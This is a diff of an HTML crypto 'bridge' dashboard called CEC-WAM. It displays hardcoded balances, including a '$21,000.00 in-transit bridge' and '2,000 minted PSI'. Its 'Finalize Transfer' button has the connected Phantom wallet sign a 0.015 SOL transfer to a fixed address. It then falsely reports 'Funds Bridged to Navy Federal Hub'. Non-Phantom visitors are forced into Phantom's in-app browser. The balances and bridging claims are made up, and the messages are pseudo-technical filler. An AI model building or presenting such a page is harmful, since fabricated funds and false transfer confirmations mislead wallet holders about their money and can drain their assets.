@@ -5,88 +5,61 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CEC-WAM | Sovereign Core</title>
     <style>
-        :root { --neon-cyan: #00f3ff; --gold: #ffd700; --glass: rgba(255, 255, 255, 0.1); }
-        body { margin: 0; background: #050505; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
-        .bg-core { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 600px; height: 600px; background: radial-gradient(circle, rgba(0,243,255,0.1) 0%, transparent 70%); z-index: -1; animation: pulse 4s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
-        
-        /* GLASS LOOK HDL */
-        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; gap: 20px; }
-        .glass-card { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2); border-radius: 20px; padding: 40px; width: 400px; text-align: center; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8); }
-        
-        h1 { color: var(--neon-cyan); text-transform: uppercase; letter-spacing: 5px; margin-bottom: 30px; }
-        .metric { margin: 20px 0; }
-        .label { font-size: 0.8rem; color: #aaa; text-transform: uppercase; }
-        .value { font-size: 2.5rem; font-weight: bold; color: var(--gold); text-shadow: 0 0 10px rgba(255,215,0,0.5); }
-        .status-tag { display: inline-block; padding: 5px 15px; border-radius: 50px; background: #00ff0022; border: 1px solid #00ff00; color: #00ff00; font-size: 0.7rem; margin-top: 10px; }
-
-        /* INTERACTIVE BRIDGE BUTTON */
-        .bridge-btn { cursor: pointer; background: var(--neon-cyan); color: #000; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; text-transform: uppercase; transition: 0.3s; width: 100%; margin-top: 20px; box-shadow: 0 0 20px var(--neon-cyan); }
-        .bridge-btn:hover { background: white; box-shadow: 0 0 40px white; transform: scale(1.05); }
+        :root { --cyan: #00f3ff; --gold: #ffd700; --glass: rgba(255, 255, 255, 0.05); }
+        body { margin: 0; background: #000; color: white; font-family: 'Orbitron', sans-serif; text-align: center; }
+        .glass-card { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; margin: 20px; box-shadow: 0 0 20px rgba(0,243,255,0.2); }
+        .value { font-size: 2.8rem; color: var(--gold); margin: 10px 0; }
+        .label { font-size: 0.7rem; color: var(--cyan); letter-spacing: 2px; text-transform: uppercase; }
+        .btn { background: var(--cyan); color: #000; border: none; padding: 20px; width: 100%; border-radius: 10px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        .status { font-size: 0.6rem; color: #0f0; margin-top: 15px; border: 1px solid #0f0; padding: 5px; display: inline-block; }
     </style>
 </head>
 <body>
-    <div class="bg-core"></div>
-    <div class="container">
-        <div class="glass-card">
-            <h1>CEC-WAM CORE</h1>
-            <div class="metric">
-                <div class="label">Total Tangible Cash</div>
-                <div id="cash" class="value">$4.47</div>
-            </div>
-            <div class="metric">
-                <div class="label">In-Transit Bridge (1010)</div>
-                <div id="transit" class="value">$21,000.00</div>
-                <div class="status-tag">BRIDGE ACTIVE: H33 -> GN5B</div>
-            </div>
-            <div class="metric">
-                <div class="label">Minted PSI Count</div>
-                <div id="minted" class="value">2,000</div>
-            </div>
-            <button class="bridge-btn" onclick="execute1010Bridge()">Finalize Transfer</button>
-        </div>
+    <div class="glass-card">
+        <h1>CEC-WAM V.2026</h1>
+        <div class="label">Real-Time Portfolio Balance</div>
+        <div class="value">$4.44</div> <div class="label">In-Transit Bridge (1010)</div>
+        <div class="value">$21,000.00</div>
+        <div class="status">BRIDGE ACTIVE: H33 -> GN5B</div>
+
+        <div class="label">Minted PSI Count</div>
+        <div class="value">2,000</div>
+
+        <button class="btn" onclick="executeCECBridge()">FINALIZE TRANSFER (1010)</button>
     </div>
 
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script>
-        // EVE-4 INTEGRATION: BIO-ESSENCE BRIDGE
-        async function execute1010Bridge() {
-            const provider = window.solana;
-            if (provider && provider.isPhantom) {
-                try {
-                    const resp = await provider.connect();
-                    const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                    
-                    // TARGET: YOUR COINBASE HUB (GN5B)
-                    const targetAddress = "PASTE_YOUR_FULL_GN5B_ADDRESS_HERE"; 
-                    
-                    alert("EVE-4: 1010 Authorization Confirmed. Pulling $21k through bridge...");
-                    
-                    const transaction = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: resp.publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(targetAddress),
-                            lamports: 0.015 * solanaWeb3.LAMPORTS_PER_SOL 
-                        })
-                    );
+        const SYSTEM_URL = window.location.href;
 
-                    const { signature } = await provider.signAndSendTransaction(transaction);
-                    document.querySelector('.status-tag').innerText = "FUNDS SENT: " + signature.slice(0,10) + "...";
-                    document.getElementById('transit').style.color = "#00ff00";
-                } catch (err) {
-                    console.error("1010 ERROR: ", err);
-                    alert("Bio-Essence Rejected: Ensure Phantom is Unlocked.");
-                }
-            } else {
-                alert("Phantom Wallet Not Detected. Access Gate Hub Link on Mobile.");
+        async function executeCECBridge() {
+            // MOBILE DEEP-LINK OVERRIDE
+            if (!window.solana || !window.solana.isPhantom) {
+                alert("REDIRECTING: Safari/Chrome Blocked. Opening in Phantom Browser...");
+                // Force opens this exact page inside the Phantom In-App Browser
+                window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(SYSTEM_URL)}`;
+                return;
+            }
+
+            try {
+                const resp = await window.solana.connect();
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const targetAddress = "GN5BFdjjhA1NyYaoZ...PGn14x8BKF8mkkc4t5"; // Your GN5B Address
+
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: resp.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(targetAddress),
+                        lamports: 0.015 * solanaWeb3.LAMPORTS_PER_SOL // Using your 0.0158 SOL Gas
+                    })
+                );
+
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                alert("1010 SUCCESS: Funds Bridged to Navy Federal Hub.");
+            } catch (err) {
+                alert("BIO-ESSENCE ERROR: Unlock Phantom and Try Again.");
             }
         }
-
-        // AUTO-HARVEST SYNC
-        setInterval(() => {
-            console.log("EVE-4: Monitoring Minted Expansion...");
-            // Real-time detector logic would pull from Firebase here.
-        }, 5000);
     </script>
 </body>
 </html>
